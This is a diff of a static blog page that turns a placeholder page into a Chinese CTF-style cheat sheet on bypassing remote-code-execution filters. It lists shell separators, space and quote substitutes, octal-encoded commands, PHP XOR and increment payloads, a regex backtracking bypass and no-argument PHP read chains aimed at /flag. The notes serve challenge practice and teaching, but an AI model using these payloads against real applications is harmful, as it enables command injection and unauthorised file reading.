@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://asd1238525.github.io/contributors/"/>
+  <link rel="canonical" href="http://asd1238525.github.io/2024/12/07/rce绕过/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,19 +33,19 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>contributors - Yunlin's Blog</title>
+  <title>RCE绕过 - Yunlin's Blog</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="分享技术知识，探讨编程问题，一起成长。 - John Doe - Yunlin's Blog">
   
-<meta property="og:type" content="website">
-<meta property="og:title" content="contributors">
-<meta property="og:url" content="http://asd1238525.github.io/contributors/index.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCE绕过">
+<meta property="og:url" content="http://asd1238525.github.io/2024/12/07/RCE%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="Yunlin&#39;s Blog">
-<meta property="og:description" content="分享技术知识，探讨编程问题，一起成长。">
+<meta property="og:description" content="管道符   ; A;B	无论真假，A与B都执行 &amp; A&amp;B	无论真假，A与B都执行 &amp;&amp; A&amp;&amp;B A为真时才执行B，否则只执行A | A|B 只显示B的结果 || A||B A为假时才执行B，否则只执行A   空格过滤这些都可以代替空格:&lt;   &lt;&gt;  %20(即space)  %09(即tab)  $IFS$9  ${IFS}">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2024-12-01T16:42:43.000Z">
-<meta property="article:modified_time" content="2024-12-01T16:42:44.000Z">
+<meta property="article:published_time" content="2024-12-07T15:57:53.000Z">
+<meta property="article:modified_time" content="2024-12-09T10:28:06.000Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2103,7 +2103,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
+  pdata.ispage=true;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2816,8 +2816,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-page" id="page" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://asd1238525.github.io/contributors/index.html">
+  <article itemscope itemtype="https://schema.org.cn/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="http://asd1238525.github.io/2024/12/07/RCE绕过/">
   <span hidden itemprop="publisher" itemscope itemtype="https://schema.org.cn/Organization">
     <meta itemprop="name" content="Yunlin's Blog">
   </span>
@@ -2838,7 +2838,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        contributors
+        RCE绕过
       </h1>
       <div class='new-meta-box'>
         
@@ -2860,10 +2860,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-12-02T00:42:43+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2024-12-07T23:57:53+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Dec 2, 2024</p>
+    <p>发布于：Dec 7, 2024</p>
   </a>
 </div>
 
@@ -2886,9 +2886,98 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    
+    <ol>
+<li>管道符</li>
+</ol>
+<ul>
+<li>; A;B	无论真假，A与B都执行</li>
+<li>&amp; A&amp;B	无论真假，A与B都执行</li>
+<li>&amp;&amp; A&amp;&amp;B A为真时才执行B，否则只执行A</li>
+<li>| A|B 只显示B的结果</li>
+<li>|| A||B A为假时才执行B，否则只执行A</li>
+</ul>
+<ol start="2">
+<li>空格过滤<br>这些都可以代替空格:&lt;   &lt;&gt;  %20(即space)  %09(即tab)  $IFS$9  ${IFS} $IFS  {cat,&#x2F;flag}</li>
+<li>反斜杠绕过<br>cat和ls被过滤,可以用c&#x2F;at和l&#x2F;s代替</li>
+<li>异或绕过<br>字符串phpinfo异或结果为”0302181”^”@[@[_^^”</li>
+<li>base64和hex绕过<br>与上差不多</li>
+<li>正则匹配绕过<br>例如flag被过滤</li>
+</ol>
+<ul>
+<li>cat &#x2F;f*</li>
+<li>cat &#x2F;f[a-z]{3}</li>
+</ul>
+<ol start="7">
+<li>引号过滤</li>
+</ol>
+<ul>
+<li>ca””t &#x2F;flag</li>
+<li>l’s’ &#x2F;flag</li>
+</ul>
+<ol start="8">
+<li>cat指令替换</li>
+</ol>
+<ul>
+<li>tac 与cat相反,按行倒序输出</li>
+<li>more 按页输出</li>
+<li>less 与more相似,但可以向上翻页</li>
+<li>od 以二进制方式输出文件内容,od -A d -c &#x2F;flag转人可读字符</li>
+<li>xxd 以二进制方式输出文件内容有可读字符显示</li>
+<li>file -f 报错文件内容</li>
+</ul>
+<ol start="9">
+<li>回溯绕过<br>php正则的回溯次数大于1000000次时返回False</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello world&#x27;</span>+<span class="string">&#x27;h&#x27;</span>*<span class="number">1000000</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/hello.*world/is&quot;</span>,<span class="variable">$a</span>) == False</span><br></pre></td></tr></table></figure>
+
+<ol start="10">
+<li>自增绕过</li>
+</ol>
+<ul>
+<li>数字 $<em>&#x3D;[].</em>;$_<em>&#x3D;$</em>[1];$<em>&#x3D;$</em>[0];$<em>++;$<em>1&#x3D;++$</em>;$</em>++;$<em>++;$</em>++;$<em>++;$</em>&#x3D;$<em>1.++$</em>.$_<em>;$</em>&#x3D;<em>.$</em>(71).$<em>(69).$</em>(84);$$_<a href="$$_%5B2%5D">1</a>;</li>
+<li>无数字无字母 $<em>&#x3D;[].</em>;$<strong>&#x3D;$_[‘!’&#x3D;&#x3D;’,’];$</strong>++;$<strong>++;$</strong>++;$<em><strong>&#x3D;++$</strong>;++$</em><em>;$</em><strong>&#x3D;++$</strong>.$<em><strong>;++$</strong>;++$</em><em>;++$<strong>;++$</strong>;++$<strong>;++$</strong>;++$<strong>;++$</strong>;++$<strong>;++$</strong>;++$<strong>;++$</strong>;$__</em>&#x3D;$<em><strong>.++$</strong>;$</em>&#x3D;’<em>‘.$</em>_<em>;$$</em><a href="$$_%5B__%5D">_</a>;</li>
+</ul>
+<ol start="11">
+<li>无回显<br>可以用sleep()函数判断</li>
+<li>无字母RCE<br>linux中使用$’xxx’（xxx为字符的八进制）的形式可以执行任意代码  执行ls:$’\154\163’<br>注意:八进制的执行方法不能执行带有参数的linux命令，如cat &#x2F;flag(&#x2F;flag为参数)或ls -la(-la为参数)<br>重定向符可以代替空格 执行cat &#x2F;flag:$’\143\141\164’&lt;$’\57\146\154\141\147’</li>
+<li>无参RCE<br>特征:</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>正则表达式 [^\W]+((?R)?) 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。其中 (?R) 是递归引用，它只能匹配和替换嵌套的函数调用，而不能处理函数参数。使用该正则表达式进行替换后，每个函数调用都会被删除，只剩下一个分号 ;,无参数rce就是不使用参数，而只使用一个个函数最终达到目的。</p>
+<ul>
+<li>scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）</li>
+<li>localeconv() ：返回包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）</li>
+<li>current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西</li>
+<li>getcwd() :取得当前工作目录</li>
+<li>chdir() :改变当前工作目录</li>
+<li>eval()、assert()：命令执行</li>
+<li>hightlight_file()、show_source()、readfile()：读取文件内容</li>
+<li>end() ： 将内部指针指向数组中的最后一个元素，并输出</li>
+<li>next() ：将内部指针指向数组中的下一个元素，并输出</li>
+<li>prev() ：将内部指针指向数组中的上一个元素，并输出</li>
+<li>reset() ： 将内部指针指向数组中的第一个元素，并输出</li>
+<li>each() ： 返回当前元素的键名和键值，并将内部指针向前移动</li>
+</ul>
+<p>查看当前目录下的文件:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?参数=<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>
+
+<p>?exp&#x3D;highligth_file(next(array_reverse(scandir(current(localeconv())))));</p>
+
   </div>
   
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
+      
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+      <!-- 打赏组件 -->
+      
+    </div>
   
   
     
@@ -2898,10 +2987,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-12-02T00:42:44+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2024-12-09T18:28:06+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Dec 2, 2024</p>
+    <p>更新于：Dec 9, 2024</p>
   </a>
 </div>
 
@@ -2920,7 +3009,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://asd1238525.github.io/contributors/index.html&title=contributors - Yunlin's Blog&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://asd1238525.github.io/2024/12/07/RCE%E7%BB%95%E8%BF%87/&title=RCE绕过 - Yunlin's Blog&summary="
           
           >
           
@@ -2932,7 +3021,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://asd1238525.github.io/contributors/index.html&title=contributors - Yunlin's Blog&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://asd1238525.github.io/2024/12/07/RCE%E7%BB%95%E8%BF%87/&title=RCE绕过 - Yunlin's Blog&summary="
           
           >
           
@@ -2944,7 +3033,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://asd1238525.github.io/contributors/index.html&title=contributors - Yunlin's Blog&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://asd1238525.github.io/2024/12/07/RCE%E7%BB%95%E8%BF%87/&title=RCE绕过 - Yunlin's Blog&summary="
           
           >
           
@@ -2975,6 +3064,20 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
 
   
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2024/12/07/md5%E7%BB%95%E8%BF%87/'>
+          <p class='title'>md5绕过<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>1.弱相等
+
+直接数组绕过
+常规0e绕过 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a
+这些字符串的 md...</p>
+        </a>
+      
+    </div>
+  
   <!-- 文章推荐 -->
   
   
@@ -2989,7 +3092,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <article class="post white-box shadow floatable blur" id="comments">
     <span hidden>
-      <meta itemprop="discussionUrl" content="/contributors/index.html#comments">
+      <meta itemprop="discussionUrl" content="/2024/12/07/RCE%E7%BB%95%E8%BF%87/index.html#comments">
     </span>
     <p ct><i class='fa-solid fa-comments'></i> 评论</p>
     
@@ -3525,7 +3628,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","sameAs":["https://github.com/volantis-x"],"description":"分享技术知识，探讨编程问题，一起成长。"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://asd1238525.github.io/","name":"Yunlin's Blog"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","keywords":null,"description":"分享技术知识，探讨编程问题，一起成长。","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","description":"分享技术知识，探讨编程问题，一起成长。"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://asd1238525.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"contributors","description":"分享技术知识，探讨编程问题，一起成长。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://asd1238525.github.io/contributors/index.html"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://asd1238525.github.io/contributors/index.html","wordCount":0,"datePublished":"2024-12-01T16:42:43.000Z","dateModified":"2024-12-01T16:42:44.000Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"https://schema.org.cn","@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"https://schema.org.cn","@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","sameAs":["https://github.com/volantis-x"],"description":"分享技术知识，探讨编程问题，一起成长。"},{"@context":"https://schema.org.cn","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://asd1238525.github.io/","name":"Yunlin's Blog"}},{"@type":"ListItem","position":3,"item":{"@id":"http://asd1238525.github.io/2024/12/07/RCE绕过/","name":"RCE绕过"}}]},{"@context":"https://schema.org.cn","@type":"WebSite","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","keywords":null,"description":"分享技术知识，探讨编程问题，一起成长。","author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/","description":"分享技术知识，探讨编程问题，一起成长。"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","url":"http://asd1238525.github.io/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://asd1238525.github.io?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"https://schema.org.cn","@type":"BlogPosting","headline":"RCE绕过","description":"分享技术知识，探讨编程问题，一起成长。","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://asd1238525.github.io/2024/12/07/RCE%E7%BB%95%E8%BF%87/"},"author":{"@type":"Person","name":"John Doe","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://asd1238525.github.io/"},"publisher":{"@type":"Organization","name":"Yunlin's Blog","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://asd1238525.github.io/2024/12/07/RCE%E7%BB%95%E8%BF%87/","wordCount":0,"datePublished":"2024-12-07T15:57:53.000Z","dateModified":"2024-12-09T10:28:06.000Z","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
